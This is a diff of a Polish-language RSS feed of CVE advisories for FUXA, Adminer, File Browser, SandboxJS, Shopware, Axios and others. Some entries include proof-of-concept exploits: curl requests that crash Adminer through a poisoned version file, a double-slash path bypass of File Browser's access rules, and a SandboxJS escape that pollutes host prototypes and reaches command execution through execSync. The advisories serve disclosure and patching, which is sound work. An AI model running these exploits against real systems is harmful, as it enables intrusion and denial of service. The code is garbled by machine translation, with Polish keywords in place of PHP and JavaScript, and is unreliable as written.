@@ -1,5 +1,304 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-25939</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25939</link><pubDate>Mon, 09 Feb 2026 22:21:03 +0000</pubDate><description>FUXA to internetowe oprogramowanie do wizualizacji procesów (SCADA/HMI/Dashboard).Od wersji 1.2.8 do wersji 1.2.10,
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-25938</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25938</link><pubDate>Tue, 10 Feb 2026 00:27:31 +0000</pubDate><description>### Podsumowanie
+
+**Opis**
+Luka w zabezpieczeniach FUXA umożliwiająca obejście uwierzytelnienia umożliwia nieuwierzytelnionemu zdalnemu atakującemu wykonanie dowolnego kodu na serwerze, gdy włączona jest wtyczka Node-RED.Dotyczy to wersji FUXA od 1.2.8 do wersji 1.2.10.Zostało to poprawione w wersji FUXA 1.2.11.
+
+### Wpływ
+Dotyczy to wszystkich wdrożeń z włączoną wtyczką Node-RED, łącznie z tymi, w których parametr `runtime.settings.secureEnabled` ma wartość true.
+
+Eksploatacja umożliwia nieuwierzytelnionemu zdalnemu atakującemu wysłanie specjalnie spreparowanego żądania do punktu końcowego `/nodered/flows` w celu ominięcia kontroli uwierzytelnienia, zapewniając atakującemu dostęp administracyjny do interfejsu API wdrażania Node-RED.Przesyłając złośliwą konfigurację przepływu, osoba atakująca może wykonać dowolny kod w kontekście usługi FUXA.W zależności od konfiguracji wdrożenia i uprawnień może to prowadzić do pełnego naruszenia bezpieczeństwa systemu i jeszcze bardziej narazić podłączone środowiska ICS/SCADA na dalsze działania.
+
+### Poprawki
+Ten problem został naprawiony w wersji FUXA 1.2.11.Zdecydowanie zachęca się użytkowników do aktualizacji do najnowszej dostępnej wersji.</description></item><item><title>CVE-2026-25918</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25918</link><pubDate>Tue, 10 Feb 2026 00:25:32 +0000</pubDate><description>Poleceniesign-package w @rage-against-the-pixel/unity-cli rejestruje poufne dane uwierzytelniające w postaci zwykłego tekstu, gdy używana jest flaga `--verbose`.Argumenty wiersza poleceń, w tym `--email` i `--password`, są wyprowadzane przez JSON.stringify bez oczyszczania, ujawniając sekrety historii powłoki, dziennikom CI/CD i systemom agregacji dzienników.
+
+Użytkownicy, którzy uruchamiają pakiet podpisów z argumentami „--verbose” i poświadczeniami, ujawniają hasła do swoich kont Unity.Dotyczy to wszystkich wersji wcześniejszych niż 1.8.2.Luka wymaga wyraźnego działania użytkownika (przy użyciu polecenia „--verbose”), ale stwarza znaczne ryzyko w zautomatyzowanych i współdzielonych środowiskach.
+
+Obejście: Użyj zmiennych środowiskowych (`UNITY_USERNAME`, `UNITY_PASSWORD`) zamiast argumentów wiersza poleceń i unikaj flagi `--verbose` podczas pracy z poświadczeniami.
+
+Nie ma to wpływu na istniejące akcje RageAgainstThePixel i Buildalon GitHub, ponieważ korzystają one wyłącznie ze zmiennych środowiskowych.</description></item><item><title>CVE-2026-25892</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25892</link><pubDate>Tue, 10 Feb 2026 00:25:24 +0000</pubDate><description>### Podsumowanie
+Adminer v5.4.1 posiada mechanizm sprawdzania wersji, w którym `adminer.org` wysyła podpisane informacje o wersji za pośrednictwem JavaScript postMessage, które następnie przeglądarka wysyła do `?script=version`.Ten punkt końcowy nie ma weryfikacji pochodzenia i akceptuje dane POST z dowolnego źródła.Osoba atakująca może POST-ować parametr `version[]`, który PHP konwertuje na tablicę.Podczas ładowania następnej strony funkcja „openssl_verify()” odbiera tę tablicę zamiast ciągu znaków i zgłasza błąd „TypeError”, zwracając wszystkim użytkownikom HTTP 500.
+
+### Napraw
+
+Uaktualnij do wersji administratora 5.4.2.
+
+**Środki zapobiegawcze** (jeśli nie możesz dokonać aktualizacji): Spraw, aby plik `adminer.version` w katalogu tymczasowym (zwykle była to wartość [upload_tmp_dir](https://www.php.net/ini.core#ini.upload-tmp-dir)) nie mógł być zapisywany przez serwer WWW.
+
+### Szczegóły
+
+**1.Zamierzony projekt `?script=version`:**
+
+Punkt końcowy jest przeznaczony do odbierania danych o wersji z `adminer.org` za pośrednictwem JavaScript przeglądarki:
+- `functions.js` linia 102-117: Tworzy iframe do `https://www.adminer.org/version/`
+- Adminer.org wysyła podpisane dane wersji poprzez `postMessage`
+- JavaScript wysyła to do `?script=version`
+- Serwer przechowuje w `/tmp/adminer.version` w celu weryfikacji podpisu
+
+```javascript
+// funkcje.js linia 117
+ajax(url + 'script=wersja', () =&gt; { }, event.data + '&amp;token=' + token);
+```
+
+**2.Luka:**
+
+Punkt końcowy sprawdza tylko `$_GET["script"] == "wersja"` - nie sprawdza poprawności:
+- Pochodzenie żądania (brak sprawdzania tokena CSRF dla tego punktu końcowego)
+- Źródło żądania (dowolny klient HTTP może POST)
+- Typy parametrów (`wersja` oczekiwana jako ciąg znaków, tablica nie odrzucona)
+
+```php
+// bootstrap.inc.php linia 32-40
+if ($_GET["skrypt"] == "wersja") {
+$nazwa pliku = get_temp_dir() ."/adminer.wersja";
+@unlink($nazwa pliku);
+$fp = plik_otwarty_blokada($nazwa pliku);
+jeśli ($fp) {
+file_write_unlock($fp, serialize(array("podpis" =&gt; $_POST["podpis"], "wersja" =&gt; $_POST["wersja"])));
+}
+Wyjście;
+}
+```
+
+**3.Wpisz błąd powodujący błąd:**
+
+Kiedy POST zawiera `wersję[]` zamiast `wersję`, PHP tworzy tablicę.Kiedy Administrator czyta ten plik i przechodzi do `openssl_verify()`:
+
+```php
+// design.inc.php linia 75
+if (openssl_verify($wersja["wersja"], base64_decode($wersja["podpis"]), $public) == 1) {
+```
+
+PHP 8.x rzuca:
+```
+TypeError: openssl_verify(): Argument nr 1 ($data) musi być typu string, podana tablica
+```
+
+### PoC
+
+**Kroki reprodukcji:**
+
+**Krok 1:** Sprawdź, czy administrator działa i jest dostępny.
+,,bicie
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888/adminer-5.4.1.php
+```
+Oczekiwany wynik:
+```
+200
+```
+
+**Krok 2:** Wyślij złośliwe żądanie POST.Składnia `version[]` powoduje, że PHP tworzy tablicę zamiast łańcucha.
+,,bicie
+curl -X POST "http://localhost:8888/adminer-5.4.1.php?script=wersja" \
+-d "podpis=x&amp;wersja[]=WTRYSK"
+```
+Oczekiwany wynik: pusta odpowiedź (brak błędu).
+
+**Krok 3:** Uzyskaj ponownie dostęp do administratora, aby wywołać awarię.
+,,bicie
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888/adminer-5.4.1.php
+```
+Oczekiwany wynik:
+```
+500
+```
+
+**Krok 4:** (Opcjonalnie) Wyświetl błąd PHP w logach serwera.
+```
+PHP Błąd krytyczny: Nieprzechwycony błąd typu: openssl_verify(): Argument nr 1 ($data) musi być typu string, tablica podana w adminer-5.4.1.php:1386
+```
+
+**Krok 5:** (Opcjonalnie) Sprawdź zatruty plik.
+,,bicie
+cat /tmp/adminer.wersja
+```
+Oczekiwany wynik:
+```
+a:2:{s:9:"podpis";s:1:"x";s:7:"wersja";a:1:{i:0;s:8:"WTRYSK";}}
+```
+
+**Odzyskiwanie:**
+,,bicie
+rm /tmp/adminer.wersja
+```
+Po usunięciu Administrator zwraca HTTP 200.
+
+---
+
+### Wpływ
+
+**Typ:** Odmowa usługi
+
+**Główna przyczyna:** Punkt końcowy `?script=version` został zaprojektowany do odbierania danych z `adminer.org` za pośrednictwem JavaScript, ale brakuje mu weryfikacji po stronie serwera.Każdy klient HTTP może wykonać POST bezpośrednio w tym punkcie końcowym.W połączeniu z brakującą walidacją typu przed `openssl_verify()`, pozwala to na trwały DoS.
+
+**Dotknięci użytkownicy:** Dowolna instancja administratora dostępna przez sieć.</description></item><item><title>CVE-2026-25890</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25890</link><pubDate>Tue, 10 Feb 2026 00:25:17 +0000</pubDate><description>### Podsumowanie
+Uwierzytelniony użytkownik może ominąć reguły aplikacji dotyczące ścieżki plików „Nie zezwalaj”, modyfikując adres URL żądania.Dodanie wielu ukośników (np. //private/) do ścieżki powoduje, że sprawdzanie autoryzacji nie jest zgodne z regułą, podczas gdy podstawowy system plików poprawnie rozpoznaje ścieżkę, udzielając nieautoryzowanego dostępu do zastrzeżonych plików.
+
+### Szczegóły
+Luka umożliwia użytkownikom ominięcie zdefiniowanych przez administratorów reguł „Nie zezwalaj”.
+
+Problem wynika ze sposobu, w jaki aplikacja obsługuje normalizację ścieżki URL i dopasowywanie reguł:
+
+1. Konfiguracja routera: Router w `http/http.go` jest skonfigurowany z `r.SkipClean(true)`.Zapobiega to automatycznemu zwijaniu się wielu ukośników (np. // staje się /), zanim żądanie dotrze do procedury obsługi.
+2. Niepewne dopasowywanie reguł: Logika egzekwowania reguł w `rules/rules.go` opiera się na prostym dopasowaniu prefiksu ciągu znaków: `strings.HasPrefix(path, r.Path)`.Jeśli reguła zabrania ustawienia //private, żądanie //private nie przejdzie tej kontroli, ponieważ //private nie zaczyna się wyłącznie od /private.
+3. Rozwiązanie systemu plików: Po pominięciu sprawdzania reguł nieznormalizowana ścieżka jest przekazywana do systemu plików.System plików traktuje wiele ukośników jako pojedynczy separator, pomyślnie rozwiązując //private/secret.txt i udostępniając plik.
+
+### PoC
+[Minimalny PoC w Pythonie](https://github.com/user-attachments/files/24823114/poc.py)
+
+Poniższe kroki demonstrują lukę:
+1. Konfiguracja:
+- Użytkownik administracyjny tworzy folder /private i dodaje plik /private/secret.txt.
+&lt;img szerokość="971" wysokość="719" alt="Screenshot_20260123_151608" src="https://github.com/user-attachments/assets/2071c92e-2bbe-46f8-a338-05b0f53d381a" /&gt;
+&lt;img szerokość="890" wysokość="386" alt="Screenshot_20260123_151551" src="https://github.com/user-attachments/assets/1def540a-de26-4666-a6ab-058d5927bfbe" /&gt;
+- Administrator dodaje regułę Disallow dla użytkownika bob na ścieżce /private.
+&lt;img szerokość="1005" wysokość="1126" alt="Screenshot_20260123_151502" src="https://github.com/user-attachments/assets/e9b57d59-f4ab-41d8-b056-8ffdaa219963" /&gt;
+
+2. Weryfikacja:
+- Użytkownik Bob żąda GET /api/resources/private/secret.txt.
+- Serwer odpowiada: 403 Zabronione.
+&lt;img szerokość="1193" wysokość="721" alt="Screenshot_20260123_154446" src="https://github.com/user-attachments/assets/dd092a10-2f8c-4a3c-b48f-d540c483bb5a" /&gt;
+3. Exploit:
+- Użytkownik Bob żąda GET /api/resources//private/secret.txt.
+- Serwer odpowiada: 200 OK (obejście pomyślne).
+&lt;img szerokość="1193" wysokość="721" alt="Screenshot_20260123_154544" src="https://github.com/user-attachments/assets/27ebb82c-f7c2-467d-ae82-f495ae3aa2d4" /&gt;
+&lt;img szerokość="1196" wysokość="818" alt="Screenshot_20260123_154618" src="https://github.com/user-attachments/assets/82035884-9a24-490d-b928-7bdd2dbe3193" /&gt;
+
+
+### Wpływ
+Luka ta wpływa na poufność i integralność danych przechowywanych w przeglądarce plików.
+- Poufność: Użytkownicy mogą czytać pliki, do których wyraźnie zakazano im dostępu.
+- Integralność: Jeśli użytkownik ma ogólne uprawnienia do zapisu, ale ma ograniczenia dotyczące określonych katalogów na mocy reguł, może ominąć te ograniczenia, aby zmieniać nazwy, usuwać lub modyfikować pliki.</description></item><item><title>CVE-2026-25881</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25881</link><pubDate>Tue, 10 Feb 2026 00:24:53 +0000</pubDate><description>### Podsumowanie
+Luka umożliwiająca ucieczkę z piaskownicy umożliwia kodowi z piaskownicy mutowanie wbudowanych prototypów hosta poprzez pranie flagi ochrony „isGlobal” za pośrednictwem pośredników literału tablicowego.Kiedy globalne odniesienie do prototypu (np. `Map.prototype`, `Set.prototype`) jest umieszczane w tablicy i pobierane, skaza `isGlobal` zostaje usunięta, umożliwiając bezpośrednią mutację prototypu z poziomu piaskownicy.Powoduje to trwałe zanieczyszczenie prototypu po stronie hosta i może umożliwić RCE w aplikacjach korzystających z zanieczyszczonych właściwości we wrażliwych ujściach (przykładowy gadżet: `execSync(obj.cmd)`.
+
+### Szczegóły
+#### Główna przyczyna:
+Sandbox implementuje mechanizm ochrony wykorzystujący flagę `isGlobal` w klasie Prop, aby zapobiec modyfikacji obiektów globalnych i ich prototypów.Jednak to śledzenie skażenia zostaje utracone, gdy wartości przechodzą przez tworzenie literału tablicy/obiektu.
+
+#### Ścieżka kodu luki `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):
+```t
+addOps(LispType.CreateArray, (exec, gotowe, zaznaczenia, a, b: Lisp[], obj, kontekst, zakres) =&gt; {
+const items = (b jako LispItem[])
+.map((element) =&gt; {
+if (instancja elementu SpreadArray) {
+return [...przedmiot.przedmiot];
+} jeszcze {
+zwrócić przedmiot;
+}
+})
+.płaskie()
+.map((element) =&gt; wartośćOrProp(element, kontekst));// &lt;- Zgubiono tutaj flagę isGlobal
+gotowe(nieokreślone, pozycje);
+});
+```
+#### Przebieg eksploatacji:
+```txt
+Kod w trybie piaskownicy: const m=[Map.prototype][0]
+↓
+Tworzenie tablicy: usuwanie skażenia isGlobal za pomocą valueOrProp()
+↓
+Mutacja prototypu: m.cmd='id' (zanieczyszczony prototyp hosta)
+↓
+Wpływ po stronie hosta: nowy Map().cmd === „id” (trwały)
+↓
+RCE (zależne od aplikacji): wywołania kodu hosta execSync(obj.cmd)
+```
+
+#### Lokalizacja obejścia ochrony `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):
+```t
+set(klucz: ciąg, wartość: nieznana) {
+// ...
+if (prop.isGlobal) { // &lt;- Ta kontrola jest pomijana
+rzuć nowy SandboxError(`Nie można zastąpić zmiennej globalnej '${key}'`);
+}
+(prop.context jak dowolny)[prop.prop] = val;
+zwrot podpórki;
+}
+```
+Gdy dostęp do prototypu odbywa się poprzez pobranie tablicy, flaga `isGlobal` nie jest już ustawiona, więc to zabezpieczenie nigdy nie jest uruchamiane.
+
+### PoC
+#### Zanieczyszczenie prototypu poprzez pośrednika w macierzy:
+```j
+const Piaskownica = wymagaj('@nyariv/sandboxjs').default;
+const piaskownica = nowa piaskownica();
+
+sandbox.compile(`
+const arr=[Mapa.prototyp];
+stała p=arr[0];
+p.polluted='pwned';
+zwróć „gotowe”;
+`)().run();
+
+konsola.log('zanieczyszczona' w ({}), nowa mapa().zanieczyszczona);
+```
+**Zaobserwowane dane wyjściowe**: „fałszywe informacje”.
+
+#### Zastąp `Set.prototype.has`:
+```j
+const Piaskownica = wymagaj('@nyariv/sandboxjs').default;
+const piaskownica = nowa piaskownica();
+
+sandbox.compile(`
+const s=[Ustaw.prototyp][0];
+s.has=jestSkończony;
+zwróć „gotowe”;
+`)().run();
+
+console.log('nadpisał:', Set.prototype.has === isFinite);
+```
+
+**Zaobserwowane wyjście**: `nadpisał: prawda`
+
+#### RCE przez gadżet hosta (zanieczyszczenie prototypu -&gt; execSync):
+```j
+const Piaskownica = wymagaj('@nyariv/sandboxjs').default;
+const { execSync } = wymagaj('proces_podrzędny');
+const piaskownica = nowa piaskownica();
+
+sandbox.compile(`
+const m=[Mapa.prototyp][0];
+m.cmd='id';
+zwróć „gotowe”;
+`)().run();
+
+const obj = nowa mapa();
+const out = execSync(obj.cmd, {kodowanie: 'utf8' }).trim();
+konsola.log(wyjście);
+```
+
+**Zaobserwowane dane wyjściowe**: `uid=501(użytkownik) gid=20(pracownicy) grupy=20(pracownicy),...`
+
+### Wpływ
+Jest to ucieczka przed piaskownicą: niezaufany kod w piaskownicy może trwale mutować wbudowane prototypy hosta (np. `Map.prototype`, `Set.prototype`), przerywając izolację i wpływając na późniejsze wykonanie hosta.RCE jest możliwe w aplikacjach, które później wykorzystują kontrolowane przez atakującego (zanieczyszczone) właściwości we wrażliwych ujściach (np. przekazując `obj.cmd` do `child_process.execSync`.
+
+**Systemy, których dotyczy problem**: dowolna aplikacja używająca `@nyariv/sandboxjs` do wykonywania niezaufanego kodu JavaScript.
+
+### Naprawa
+- Zachowaj ochronę `isGlobal` podczas tworzenia literału tablicy/obiektu (nie rozpakowuj `Prop` na surowe wartości w sposób, który usuwa skażenie globalne/prototypowe).
+- Dodaj twardą blokadę zapisów do wbudowanych prototypów (np. `Map.prototype`, `Set.prototype` itp.), nawet jeśli są one uzyskiwane pośrednio poprzez literały.
+- Dogłębna obrona: zamrażanie wbudowanych prototypów w procesie hosta przed uruchomieniem niezaufanego kodu (może to działać nieprawidłowo w przypadku niektórych konsumentów).</description></item><item><title>CVE-2026-25878</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25878</link><pubDate>Tue, 10 Feb 2026 00:22:05 +0000</pubDate><description>### Podsumowanie
+Nieuwierzytelniony dostęp do interfejsu administratora
+
+### Szczegóły
+Trasa administratora (/admin/adminer) była dostępna bez uwierzytelnienia administratora Shopware.Trasa została skonfigurowana z wartością auth_required=false i nie przeprowadzała sprawdzania poprawności sesji, przez co interfejs administratora był widoczny dla nieuwierzytelnionych użytkowników.
+
+Uwaga: sam dostęp do bazy danych wymaga poświadczeń, które są ustawiane wyłącznie za pośrednictwem punktu końcowego API chronionego przez listę ACL.Bezpośredni dostęp do bazy danych bez uprzedniego zalogowania administratora nie jest możliwy ze względu na samą tę lukę.
+
+### Wpływ
+Nieuwierzytelniony użytkownik może uzyskać dostęp do interfejsu administratora, potencjalnie ujawniając informacje o wersji lub wykorzystując luki specyficzne dla administratora.
+
+### Poprawki
+Wersja 2.2.1 dodaje sprawdzanie sesji.Trasa administratora weryfikuje teraz flagę sesji uwierzytelnionej przed renderowaniem — w przeciwnym razie zwraca HTTP 403.
+
+### Obejścia
+Dezaktywuj lub odinstaluj wtyczkę.</description></item><item><title>CVE-2025-15314</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15314</link><pubDate>Mon, 09 Feb 2026 23:05:16 +0000</pubDate><description>Tanium rozwiązało lukę w zabezpieczeniach umożliwiającą usunięcie dowolnego pliku w end-user-cx.
+
+CVSS Score: 5.5 (medium)</description></item><item><title>CVE-2025-15318</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15318</link><pubDate>Mon, 09 Feb 2026 22:56:27 +0000</pubDate><description>Tanium rozwiązało lukę w zabezpieczeniach umożliwiającą usunięcie dowolnego pliku w narzędziach końcowych powiadomień użytkownika końcowego.
+
+CVSS Score: 5.1 (medium)</description></item><item><title>CVE-2025-15319</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15319</link><pubDate>Mon, 09 Feb 2026 22:52:32 +0000</pubDate><description>Tanium rozwiązało lukę w zabezpieczeniach umożliwiającą eskalację uprawnień lokalnych w narzędziach Patch Endpoint Tools.
+
+CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-25939</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25939</link><pubDate>Mon, 09 Feb 2026 22:21:03 +0000</pubDate><description>FUXA to internetowe oprogramowanie do wizualizacji procesów (SCADA/HMI/Dashboard).Od wersji 1.2.8 do wersji 1.2.10,
 luka w zabezpieczeniach FUXA umożliwiająca obejście autoryzacji umożliwia nieuwierzytelnionemu zdalnemu atakującemu tworzenie i modyfikowanie dowolnych programów planujących, narażając podłączone środowiska ICS/SCADA na dalsze działania.Zostało to poprawione w wersji FUXA 1.2.11.</description></item><item><title>CVE-2026-25889</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25889</link><pubDate>Mon, 09 Feb 2026 21:18:13 +0000</pubDate><description>Przeglądarka plików zapewnia interfejs zarządzania plikami w określonym katalogu i może być używana do przesyłania, usuwania, podglądu, zmiany nazwy i edycji plików.W wersjach wcześniejszych niż 2.57.1 ​​w logice sprawdzania poprawności hasła rozróżniana była wielkość liter, która umożliwia każdemu uwierzytelnionemu użytkownikowi zmianę hasła (lub administratorowi zmianę hasła dowolnego użytkownika) bez podawania bieżącego hasła.Użycie nazwy pola tytułu „Hasło” zamiast „hasła” z małej litery w żądaniu API powoduje całkowite pominięcie weryfikacji bieżącego hasła.Umożliwia to przejęcie konta, jeśli osoba atakująca uzyska prawidłowy token JWT za pośrednictwem XSS, przejęcia sesji lub w inny sposób.Luka ta została naprawiona w wersji 2.57.1.
 
 CVSS Score: 5.4 (medium)</description></item><item><title>CVE-2026-25740</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25740</link><pubDate>Mon, 09 Feb 2026 20:17:16 +0000</pubDate><description>przeglądarka przechwytująca, dedykowana instancja Chrome do logowania się do portali przechwytujących bez konieczności zmiany ustawień DNS.W wersji 25.05 i wcześniejszych, gdy włączona jest przeglądarka files.captive-browser, każdy użytkownik systemu może uruchamiać dowolne polecenia z możliwością CAP_NET_RAW (wiązanie z portami uprzywilejowanymi, fałszowanie ruchu hosta lokalnego z usług uprzywilejowanych...).Luka ta została naprawiona w wersjach 25.11 i 26.05.</description></item><item><title>CVE-2026-25639</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25639</link><pubDate>Mon, 09 Feb 2026 20:11:22 +0000</pubDate><description>Axios to klient HTTP oparty na obietnicach dla przeglądarki i Node.js.W wersjach wcześniejszych niż 1.13.5 funkcja mergeConfig w axios ulega awarii z powodu błędu TypeError podczas przetwarzania obiektów konfiguracyjnych zawierających __proto__ jako własną właściwość.Osoba atakująca może to wywołać, dostarczając złośliwy obiekt konfiguracyjny utworzony za pomocą JSON.parse(), powodując całkowitą odmowę usługi.Luka ta została naprawiona w wersji 1.13.5.
